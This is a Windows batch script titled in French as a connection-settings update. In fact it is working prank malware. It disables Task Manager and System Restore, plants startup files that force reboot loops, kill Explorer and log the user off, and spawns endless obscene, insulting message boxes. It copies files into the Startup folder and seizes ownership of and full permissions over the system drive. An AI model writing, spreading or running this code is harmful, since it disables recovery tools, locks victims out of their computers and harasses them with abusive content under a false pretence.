@echo off

set cmdline=
set cpath="%~dp0"
set /a msg=%random%
set /a pute=%random%
set /a use=%random%
title "mise a jour des parametres de connexion."

cd /d "%~dp0"


REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f >nul

cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
echo shutdown -r -t 10 -c "AYAAAAAAAAAAAAAAA EZ EZ EZ EZ EZ EZ EZ EZ EZ EZ EZ EZ EZ AYAAAAAAA">papa.bat

echo do>%msg%.vbs

echo x=msgbox ("LE 18-25 T'A BIEN BAISER LE FION PUTAIN DE GROS FILS DE PUTE" ,16+4096, "L'Elite de la nation")>>%msg%.vbs
echo CreateObject("WScript.Shell").Run "%msg%.vbs">>%msg%.vbs
echo loop>>%msg%.vbs

echo do>%pute%.vbs  
echo CreateObject("WScript.Shell").Run "spam.exe">>%pute%.vbs
echo loop>>%pute%.vbs

echo @echo off>%use%.bat
echo taskkill /f /im explorer.exe>>%use%.bat
echo timeout /t 10>>%use%.bat
echo logoff>>%use%.bat

echo echo pute pute pute>OMG.bat
echo title BAHAHHAHAHA>>omg.bat
echo pause>>omg.bat

cls

copy "%temp%\booster\*.*" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /y >nul

cls

takeown /f %systemdrive%\*.* >nul
Icacls %systemdrive%\*.* /C /G %username%:F >nul

exit